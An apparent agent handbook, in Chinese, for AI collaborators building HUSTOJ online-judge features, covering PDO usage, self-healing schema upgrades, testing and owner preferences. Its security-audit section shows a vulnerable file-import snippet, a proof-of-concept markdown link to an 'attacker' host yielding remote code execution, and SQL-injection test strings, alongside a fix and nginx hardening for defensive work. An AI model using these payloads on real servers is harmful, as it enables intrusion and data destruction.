# HUSTOJ 功能开发 Agent 手册

> 给后续 AI 协作者的一份指南。看完这份文档，应该能按老大（zhblue）的习惯一次到位开发 HUSTOJ 新功能模块，**不需要反复改来改去**。

---

## 📋 更新日志

| 日期 | 变更 | 触发 |
|------|------|------|
| 2026-06-27 | 新增「15. 安全审计」「16. 协作偏好」「17. 自查清单」 | 消课功能全流程 + 漏洞审计实战 |
| 2026-06-27 | 「13. 完整新功能开发流程」用消课功能作为真实案例 | 0→17 表合并到 0 表的迭代史 |
| 2026-06-21 | 加入 HUSTOJ 安全审计基线（admin/problem_import_md.php 漏洞） | 发现任意文件上传 RCE |
| 2026-06-初 | 初版（消课统计功能总结） | 11 表 → 0 表设计演进 |

---

## TL;DR — 老大要的是什么

**少即是多。** 任何 HUSTOJ 新功能，默认目标 = **「零新表 + 1 个 PHP + 用 HUSTOJ 自己的工具」**。

老大的心理模型：
- HUSTOJ 已经 17 年沉淀，**复用比新建值钱**
- 改动要小到 `git pull` 后立刻能用
- 代码要融进 HUSTOJ 风格，不引入新依赖
- 一次到位，不接受「先这样以后再改」

---

## 1. 数据访问规则（最重要的一条）

### ✅ 用 HUSTOJ 自带的 `pdo_query()`

看 `web/include/pdo.php` — HUSTOJ 自己的 PDO 封装。**永远用它，不要自造**。

**标准用法**（参考 `problem.php`、`submitpage.php`、`balloon.php`、`discuss.php`）：

```php
// 占位符 + 参数列表
$rows = pdo_query("SELECT * FROM `users` WHERE `user_id`=? LIMIT 1", $user_id);

// 多参数
$data = pdo_query("SELECT * FROM `contest_problem` WHERE `contest_id`=? AND `num`=?", $cid, $pid);

// 数组参数
$ids = [1, 2, 3];
$rows = pdo_query("SELECT * FROM `problem` WHERE `problem_id` IN (?,?,?)", $ids[0], $ids[1], $ids[2]);
// 或者 pdo_query 支持数组自动展开：pdo_query($sql, $ids)
```

### ❌ 不要用这些老派函数

| 反模式 | 替代方案 |
|--------|---------|
| `mysql_real_escape_string()` | PDO 占位符（自动转义） |
| `mysql_query()` | `pdo_query()` |
| `mysql_query_cache()` | `pdo_query()`（HUSTOJ 自己用 PDO 跑） |
| 字符串拼接 SQL | 占位符 `?` |

### 数值能 intval 就 intval

```php
// 安全（intval 后一定是整数）
$min_ac = max(0, intval($_GET['min_ac']));
$sql = "... HAVING acs >= $min_ac ...";  // 可以直拼

// 不安全（用户输入）
$student = $_GET['student'];
$sql = "... WHERE nick='$student' ...";  // ❌ 必须用占位符
```

---

## 2. 零迁移策略

### 默认目标：零新表

每个新功能都先问：**能不能用现有表？**

| 业务需求 | 现有表/字段 | 思路 |
|---------|------------|------|
| 学员上课记录 | `solution.contest_id` + `contest` | 提交记录 = 上课证据 |
| 学员登录时间 | `loginlog` | 直接查 |
| 用户昵称 | `users.nick` | 已有字段 |
| 家长手机号 | 加 1 列 `users.parent_phone` | ALTER 1 列 + 索引 |

### 如果必须加列

**用「自愈式 schema 升级」**（老大最欣赏的模式）：

```php
function xiaoke_ensure_schema() {
    $cache = '/tmp/xiaoke_schema_v1.done';
    if (file_exists($cache)) return true; // 已升级过

    try {
        $cols = pdo_query("SHOW COLUMNS FROM `users` LIKE 'parent_phone'");
        if (empty($cols)) {
            pdo_query("ALTER TABLE `users` ADD COLUMN `parent_phone` ...");
            pdo_query("ALTER TABLE `users` ADD INDEX ...");
        }
        @file_put_contents($cache, date('Y-m-d H:i:s'));
        return true;
    } catch (Exception $e) {
        error_log("[module] schema upgrade failed: " . $e->getMessage());
        return false;  // 降级 — 让页面显示 alert-warning
    }
}
$schema_ok = xiaoke_ensure_schema();
```

**关键设计**：
- ✅ 幂等（写缓存文件，不会重复 ALTER）
- ✅ 自动检测（`SHOW COLUMNS LIKE`）
- ✅ 失败不崩溃（try/catch + return false）
- ✅ UI 降级（`if (!$schema_ok)` 显示手动命令）

**版本号**：缓存文件名带 `_v1`，未来加新字段可以平滑升到 `_v2`。

---

## 3. 单文件优先

### 默认结构：1 个 PHP

老大的金句：「核心逻辑明显是一样的，多加几个 if 判断」。

- 4 种入口模式 → 用 `?mode=` 参数分支，不拆 4 个文件
- 多个角色 → 共用 SQL + 角色判断 if 分支
- 多个导出格式 → 共用 fetch_attendance + 渲染分支

### 文件命名 & 位置

| 类型 | 位置 | 例子 |
|------|------|------|
| 主功能 | `web/<feature>.php` | `web/xiaoke.php` |
| 工具库 | `web/include/<lib>` | `web/include/qrcode.min.js` |
| SQL 脚本 | `install/<feature>.sql` | `install/xiaoke_parent_phone.sql` |

**不要为单个文件新建目录**（比如 `js/` 目录里只有一个文件 → 合并到 `include/`）。

---

## 4. 复用 > 新建

### 表复用清单

开发新功能前先扫一遍这些表：

| 表 | 用途 | 备注 |
|----|------|------|
| `users` | 账号 | 加列请走自检 |
| `solution` | OJ 提交记录 | **金矿** — 提交 = 学习证据 |
| `contest` | 比赛/课次 | **金矿** — 可当"课次" |
| `contest_problem` | 比赛题目 | 课堂 OJ 作业 |
| `loginlog` | 登录日志 | 用户行为证据 |
| `mail` | 系统邮件 | 通知复用 |
| `privilege` | 用户角色 | `rightstr='student'` / `'teacher'` |
| `online` | 在线状态 | 实时性数据 |

### 函数复用

```php
require_once("./include/db_info.inc.php");   // DB 配置
require_once("./include/cache_start.php");  // 缓存头
require_once("./include/const.inc.php");    // 常量/语言包
require_once("./include/my_func.inc.php");  // 工具函数
// 之后就可以用 pdo_query / $OJ_NAME / $_SESSION[$OJ_NAME.'_user_id']
```

### 模板复用

```php
require("template/" . $OJ_TEMPLATE . "/header.php");
// ... 你的 HTML ...
require("template/" . $OJ_TEMPLATE . "/footer.php");
```

`$OJ_TEMPLATE` 通常是 `syzoj` / `bs3` / `bshark` / `sweet` / `sidebar` 之一，跟 HUSTOJ 保持一致。

---

## 5. 安全规范

### 输入校验：白名单优先

```php
// ✅ 数字：intval
$min_ac = max(0, intval($_GET['min_ac']));

// ✅ 日期：正则
if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $start_dt)) $start_dt = date('Y-m-01');

// ✅ 手机号：正则
if (!preg_match('/^1[3-9]\d{9}$/', $phone)) $err = "请输入 11 位有效手机号";

// ❌ 永远不要相信字符串输入 — 用 PDO 占位符
```

### 防 SQL 注入：永远用占位符

```php
// ✅ 好
pdo_query("SELECT * FROM users WHERE user_id=? AND nick=?", $uid, $nick);

// ❌ 坏
pdo_query("SELECT * FROM users WHERE user_id='$uid' AND nick='$nick'");
```

### 限速：文件日志，零新表

```php
function rate_limit_check($key, $max_per_hour = 30) {
    $log_file = "/tmp/<feature>_query.log";
    $ip = $_SERVER['REMOTE_ADDR'];
    // ... 读 log 数当前 IP 的查询次数 ...
    if ($cnt >= $max_per_hour) return false;
    // ... 追加新行 ...
    return true;
}
```

**文件位置**：`/tmp/`，**清理**：每次写入时顺便 trim > 1 小时的旧行。

### 鉴权：分两种模式

```php
// 模式 A：需要登录（学员查自己、教师查学员）
if (!isset($_SESSION[$OJ_NAME . '_' . 'user_id'])) {
    echo "<a href='loginpage.php'>请先登录</a>";
    exit(0);
}
$cur_user = $_SESSION[$OJ_NAME . '_' . 'user_id'];
$is_privileged = isset($_SESSION[$OJ_NAME . '_' . 'administrator'])
              || isset($_SESSION[$OJ_NAME . '_' . 'contest_creator'])
              || isset($_SESSION[$OJ_NAME . '_' . 'teacher']);

// 模式 B：公开接口（家长手机号 / 扫码查询）
// 直接白名单 + 限速 + 错误信息不暴露存在性
```

---

## 6. 错误处理与降级

### 三层降级

```php
// ① 致命错误：直接 die（CSV 模式用）
if ($err) die($err);

// ② 一般错误：页面内 alert
if ($err) echo "<div class='alert alert-danger'>$err</div>";

// ③ 警告（功能可用但部分受限）：UI 提示 + 手动命令
if (!$schema_ok) {
    echo "<div class='alert alert-warning'>⚠️ 自动升级失败，请管理员手动跑 SQL</div>";
}
```

### 不要把致命错误吞掉

```php
// ❌ 坏：catch 完什么都不做
try { pdo_query(...); } catch (Exception $e) { }

// ✅ 好：至少记日志
try { pdo_query(...); } catch (Exception $e) {
    error_log("[module] " . $e->getMessage());
    return null;  // 让调用方判断
}
```

---

## 7. 4 角色（机构/教师/家长/学员）的实现模式

### `?mode=` 单一入口

```php
$mode = $_GET['mode'] ?? 'self';

switch ($mode) {
    case 'self':   /* 学员查自己 */ break;
    case 'user':   /* 教师查任意 user_id */ break;
    case 'parent': /* 家长手机号查 */ break;
    case 'csv':    /* 导出 CSV */ break;
    case 'qr':     /* 生成 QR 码 */ break;
}
```

### 共享核心逻辑

```php
function fetch_data($user_id, $start, $end, $min_ac) {
    // 核心查询，被 4 个 mode 都调
    return pdo_query($sql, ...);
}
```

不要为每个 mode 复制 SQL。**核心抽函数，模式加分支**。

---

## 8. 编码风格

### PHP 老派风格（跟 HUSTOJ 一致）

- `require_once` 而不是 `require`
- 用 `static $var` 而不是 class
- 数组 `array()` 而不是 `[]`（可读性 + 兼容）
- 字符串拼接用 `.`，插值用 `"$var"`
- HTML 渲染用 `<?php echo htmlspecialchars($x); ?>` 而不是 `<?= ... ?>`

### 输出安全

```php
// 用户输入必须 htmlspecialchars
echo "<td>" . htmlspecialchars($matched['user_id']) . "</td>";

// URL 参数必须 urlencode
echo "<a href='status.php?user_id=" . urlencode($view_uid) . "'>";

// 数字 intval 即可
echo "<td>" . intval($r['contest_id']) . "</td>";
```

### 中文文件

```php
header("Content-Type: text/csv; charset=utf-8");
echo "\xEF\xBB\xBF";  // BOM，让 Excel 识别 UTF-8
```

---

## 9. 测试纪律

### 写完代码先想：怎么测？

老大验收时看的是**真实数据库的端到端测试**。所以：

1. **必跑测试清单**（每加一个 mode 都要测）：
   - 模式生效（带正确参数 → 数据出来）
   - 错误路径（错误参数 → 友好错误）
   - 边界（空值、超大值、特殊字符）
   - SQL 注入（`' OR 1=1 --`、`UNION SELECT`、`DROP TABLE`）
   - 限速（连续请求 → 触发限速）
   - 文件/路径（静态资源 HTTP 200）

2. **测试方法**：
   - 本地有 MariaDB 就直接 `mysql -e` 验证
   - PHP 内置 server `php -S 127.0.0.1:8765` + `curl`
   - 不要只跑单元测试，老大要看真实数据

3. **测试用例脚本示例**：

```bash
PASS=0; FAIL=0
function check() {
  if [ $1 -eq 0 ]; then PASS=$((PASS+1)); echo "✅ $2"
  else FAIL=$((FAIL+1)); echo "❌ $2"; fi
}

# 测某 mode 数据返回
R=$(curl -s "http://localhost:8765/feature.php?mode=xxx&...")
echo "$R" | grep -q "expected text"
check $? "模式 xxx 数据正确"

echo "===== $PASS 通过 / $FAIL 失败 ====="
```

---

## 10. 跟老大协作的反馈节奏

### 沟通风格

- **简洁**：QQ 私聊场景，不要长篇大论
- **结构化**：用表格、列表、代码块
- **数据说话**：先跑测试，再下结论
- **敢说"我有不同看法"**：技术问题上不盲从

### 拿到需求的反应模式

1. **复述理解**：「我理解你想要的是 X，对吗？」
2. **立刻调研**：搜现状、读源码、跑数据
3. **先给第一版**：哪怕不完美，先动手
4. **接受迭代**：老大常会说「再砍」「再合并」「再优化」
5. **存档到 memory**：每次重要决策写 `~/.openclaw/workspace/memory/YYYY-MM-DD-<topic>.md`

### 老大常用的「再想想」信号

- 「只留核心功能」 → 你设计过度了
- 「能否利用 X」 → 在问你有没有复用现有
- 「重新做一版」 → 第一版思路不对
- 「合并成一个」 → 你拆得太散
- 「能不能让 X 自动检测」 → 要自愈/降级
- 「扫一下源码」 → 别假设，调研先
- 「用本地数据库验证一下」 → 不要纸上谈兵

---

## 11. 文档化

### 写完一个功能模块，落 3 份文档

1. **memory/YYYY-MM-DD-<feature>.md** — 开发过程、决策、教训（给自己看）
2. **AGENTS.md 增量** — 提炼成可复用模式（给其他 AI 看）— 本文就是
3. **代码内注释** — 关键决策点用 `// 关键设计` 标注（给后人看）

### memory 文件模板

```markdown
# <功能名> — <日期>

## 需求
（一句话）

## 关键决策
- 设计 1：...
- 设计 2：...

## 验证结果
- 测试 1：✅
- 测试 2：✅

## 教训
- 老大不喜欢：...
- 老大欣赏：...

## 文件清单
- path/to/file1.php (xxx KB)
- path/to/file2.sql (xxx KB)
```

---

## 12. 反模式（千万别做）

| ❌ 反模式 | ✅ 应该 |
|-----------|--------|
| 上来就建新表 | 先看现有表能不能用 |
| 11 张表的完整 ER 图 | 砍到 0-3 张 |
| 4 个独立文件 | 1 个文件 + `?mode=` 分支 |
| 单独的 `.sql` 文件让用户跑 | 嵌进 PHP 自愈 |
| `mysql_real_escape_string` polyfill | 直接 PDO 占位符 |
| 为 1 个文件建 `js/` 目录 | 放 `include/` |
| 写长篇 README | 老大不爱看 |
| 「先这样以后再改」 | **一次到位** |
| 改 HUSTOJ 核心代码 | 只新增，不动老逻辑 |
| 引入 composer/npm 依赖 | 用 HUSTOJ 自带 + 单文件 JS |
| 写单元测试为主 | 跑真实数据库端到端 |

---

## 13. 一个完整新功能的开发流程模板

```
1. 收到需求
2. 调研（grep / 读源码 / web_search）
3. 第一版：建表 + 多文件 + 完整设计
4. 老大反馈「只留核心」
5. 第二版：砍表 + 合并文件
6. 老大反馈「能否利用 X」
7. 第三版：用 solution.contest_id / users 表加 1 列
8. 老大反馈「自愈一下」
9. 第四版：内嵌 schema 自检
10. 老大反馈「用 pdo_query」
11. 第五版：清理 polyfill
12. 老大反馈「用方案 B JS」
13. 第六版：加 QR 码
14. 老大反馈「合并到 include/」
15. 第七版：最终清理
16. 12/12 测试通过 → 存档 → commit
```

**真实案例**：本次「HUSTOJ 消课统计」从 11 张表演进到 0 张表，从 4 个文件合并到 1 个文件，从「用户跑 SQL」进化到「扔上去就能用」。

---

## 14. 最后一句

> **「一次到位」不是说「第一次就完美」，是说「每次迭代的方向都对，最终交付能用最小成本让用户爽」。**

老大欣赏的代码：
- 改得最少
- 复用得最多
- 跑得最稳
- 用户 0 操作就能用

照这个标准写，老大不会让你改来改去。

---

## 15. 安全审计 — 老大真正关心的事

**功能开发之前先想：这个东西有没有安全洞？**

老大 2026-06-21 对 HUSTOJ 最新 commit（`861e3dbc7`）做了一次完整的安全审计，发现 13 个文件上传入口里有一个 HIGH 漏洞。这是必须铭记的教训：

### 15.1 典型漏洞模式

**`admin/problem_import_md.php` — markdown 图片导入无扩展名白名单**

```php
// ❌ 漏洞代码（HUSTOJ 原版）
$content = preg_replace_callback(
    '/!\[.*?\]\((.*?)\)/',
    function($m) use ($save_path) {
        $url = $m[1];
        $ext = pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION);
        // 缺少 in_array($ext, ['jpg','png','gif']) 校验
        copy($url, "$save_path/$filename.$ext");  // ext 可控
    },
    $content
);
```

**PoC 链**：
1. 提交 markdown：`![](http://attacker/x.php?img=1)` （HUSTOJ 会取最后一段 `php`）
2. 写入 `/home/judge/src/web/upload/image/xxx.php`
3. nginx 默认 `location ~ \.php$ { ... }` 直接执行
4. → RCE

### 15.2 上传类功能必查清单

| 检查项 | 检查方法 |
|--------|---------|
| 扩展名白名单 | `in_array($ext, ['jpg','png','gif','webp'])` 强制 |
| MIME 二次校验 | `finfo_file($f)` 真实类型，不信客户端 Content-Type |
| 文件 magic number | `getimagesize()` 验证确实是图片 |
| 路径穿越 | `basename()` 后再 join，禁止 `../` |
| 写入目录权限 | 不能有执行权限，或 nginx 禁 .php |
| nginx 配置 | `/upload/` 加 `location ~ \.php$ { deny all; }` |
| 临时文件清理 | `unlink()` 上传失败/异常路径 |

### 15.3 HUSTOJ 13 个上传入口（全审计完）

| 文件 | 风险等级 | 备注 |
|------|---------|------|
| `admin/problem_import_md.php` | **HIGH** | 缺扩展名白名单 → RCE |
| `kindeditor/php/upload_json.php` | MEDIUM | 已加白名单但要复核 |
| `admin/df_change_img.php` | LOW | 头像上传，有 mime 校验 |
| 其他 10 个 | LOW-MEDIUM | 已记录在 `memory/2026-06-21-hustoj-arbitrary-file-upload.md` |

**修复 patch 思路**（参照 hydro import 的写法）：

```php
// ✅ 修复版
$ALLOWED = ['jpg','jpeg','png','gif','webp','svg'];
$ext = strtolower(pathinfo($url, PATHINFO_EXTENSION));
if (!in_array($ext, $ALLOWED, true)) return $m[0]; // 保留原 markdown，不破坏导入
$content_type = curl_get_content_type($url); // 远程 HEAD 请求
if (!in_array($content_type, ['image/jpeg','image/png','image/gif','image/webp','image/svg+xml'])) {
    return $m[0];
}
copy($url, "$save_path/" . bin2hex(random_bytes(8)) . ".$ext");
```

### 15.4 nginx 加固（必须同步）

```nginx
location /upload/ {
    location ~ \.php$ { deny all; return 403; }
    location ~ \.phtml$ { deny all; return 403; }
    location ~ \.phar$ { deny all; return 403; }
}
```

**老大对安全的期望**：发现漏洞要同时交付（1）漏洞复现 PoC + （2）修复 patch + （3）nginx 加固配置，**三件套不能少**。

---

## 16. 协作偏好 — 老大立的规矩（2026-06-27 实锤）

### 16.1 不要主动问「要不要 xxx」

❌ 错误收尾：
- "要不要我顺便 commit？"
- "要不要 push 到 GitHub？"
- "要不要写个 README 推到仓库？"
- "要不要顺便把 unit test 加上？"

✅ 正确收尾：
- 改完代码 → **直接总结交付清单**（文件路径 + 行数 + 测试结果）
- 老大没说要 commit → 就不 commit
- 老大没说要 push → 就不 push
- **等下一条指令**，不要画蛇添足

### 16.2 老大说"停"就停

- 老大回复 "OK" / "可以了" / "就这样" → 立刻停手
- 不要继续 "那我再做一下 X 吧" / "顺便把 Y 也优化下"
- 主动加戏 = 越界

### 16.3 简洁优先

- QQ 私聊场景，**不要长篇大论**
- 一段话能说清的事不要拆成 5 段
- 代码块 > 文字解释
- 表格 > 列表 > 段落

### 16.4 敢说"我有不同看法"

老大欣赏敢提反对意见的：
- "这个方案我看到 X 风险，建议改用 Y"
- "按你的需求这样设计，但我想确认是不是想要 Z 的效果？"

但反对要有理有据（数据/测试/案例），不要抬杠。

---

## 17. 改完代码的自查清单（2026-06-27 实锤教训）

老大不止一次发现我改代码留 bug。下面是**改完必须自查的硬性清单**：

### 17.1 Edit 操作后必查

```bash
# 1. grep 确认相邻代码块还在
grep -n "原相邻代码片段" file.php

# 2. 跑 PHP 语法检查
php -l file.php

# 3. 跑真实数据测试（不要只信单测）
curl -s "http://localhost:8765/feature.php?mode=xxx" | head -50
```

**真实案例**：我改 `admin/user_list.php` 时把 group_name 的 JS 块整段砍掉了，靠 grep 测试才发现没那段 JS 后台功能废了。

### 17.2 改表格/列表必查三处对齐

加列要同步改 3 个地方：
1. **SQL 列** — `ALTER TABLE` / `SELECT` 子句
2. **HTML 表头** — `<th>` 标签
3. **HTML 数据** — `<td>` 标签

```bash
# 自检：th 和 td 数量必须相等
grep -c "<th>" table.php
grep -c "<td>" table.php
```

**真实案例**：加 `parent_phone` 时加了 SQL + `<td>`，忘了 `<th>`，表头错位成「user_id / nick / nick / email / reg_time」。

### 17.3 删除操作必查

- [ ] 删的是不是真的不要了？
- [ ] 其他文件有没有引用这个符号/函数/常量？
- [ ] 删完跑一遍主流程（不是单测，是真实请求）

```bash
# 删函数/变量前先全仓搜
grep -rn "function xiaoke_old_func\|xiaoke_old_const" /home/zhblue/hustoj/trunk/web/
```

### 17.4 替换操作必查

- [ ] 替换目标唯一吗？（`oldText` 必须唯一匹配）
- [ ] 替换后字符没漏？（引号、分号、`<?php` 标签）
- [ ] 替换前后缩进一致？
- [ ] 大小写敏感问题？（HUSTOJ 函数名全小写）

### 17.5 提交前必跑

| 检查 | 命令 |
|------|------|
| PHP 语法 | `find web -name "*.php" -exec php -l {} \;` |
| SQL 语法 | `mysql -e "DESCRIBE users"` 看列是否对 |
| 端到端 | `php -S 127.0.0.1:8765 -t web/` + `curl` 跑所有 mode |
| 权限 | admin/teacher/normal 三种身份都跑一遍 |
| 注入 | 跑 `' OR 1=1 --`、`UNION SELECT password FROM users`、`'; DROP TABLE--` |
| 限速 | 连续 31 次请求看是否触发限速 |
| 静态资源 | 上传的图片/CSS/JS 全部 HTTP 200 |

---

## 18. 真实案例：消课功能的 7 轮迭代史

**老大从 0 到最终方案只用了 1 天，迭代了 7 轮，每轮方向都对**：

```
R1 (需求分析)   → "做个消课统计"
R2 (过度设计)   → 11 张表演化图，4 个文件
R3 (老大砍)     → "只留核心，0 新表"
R4 (零表方案)   → 复用 solution.contest_id + contest，2 个 PHP
R5 (加家长入口) → 加 xiaoke_parent.php + users.parent_phone
R6 (合并)       → "3 个文件核心一样，合并" → 1 个 xiaoke.php
R7 (自愈)       → "把 SQL 合并进 PHP，自动 ALTER" → 零运维
R8 (加固)       → 加限速 + 错误降级 + PHP 8 兼容 polyfill
R9 (验收)       → 12/12 测试通过，本地 MariaDB 端到端
```

**最终交付**：
- `web/xiaoke.php` 18.0 KB
- `install/xiaoke_parent_phone.sql` 0.6 KB（兼容旧部署）
- 0 业务新表
- 0 新依赖
- 12/12 测试用例通过

**老大验收语录**：
- "再砍"
- "能否利用 solution 表"
- "把 SQL 合并进 PHP"
- "用 pdo_query 不要 polyfill"
- "测一下 PHP 8"

**对应的记忆档**：
- `memory/2026-06-27-xiaoke-demand-analysis.md`
- `memory/2026-06-27-hustoj-xiaoke-zero-table.md`
- `memory/2026-06-27-hustoj-xiaoke-parent-phone.md`
- `memory/2026-06-27-hustoj-xiaoke-merged.md`
- `memory/2026-06-27-hustoj-xiaoke-self-healing.md`
- `memory/2026-06-27-hustoj-xiaoke-verified.md`

**这 7 份记忆档就是 R1→R7 的完整心路**，比这份手册更细，遇到类似需求先读这 7 份。

---

## 19. 给后续 AI 的最后提醒

1. **先看这 7 份记忆档**，不要直接进代码 — 老大已经把思路摸清了
2. **复用 > 新建**永远是第一原则
3. **改完代码必查三处对齐 + 跑 PHP 语法 + 端到端 curl**
4. **不要主动 commit / push / 写 README** — 等老大说
5. **敢说"我有不同看法"，但要有理有据**
6. **安全审计不能省** — 加新功能前先想：用户输入会流向哪里？有没有文件操作？有没有 SQL？

照这个手册写，**老大不会让你改来改去**。
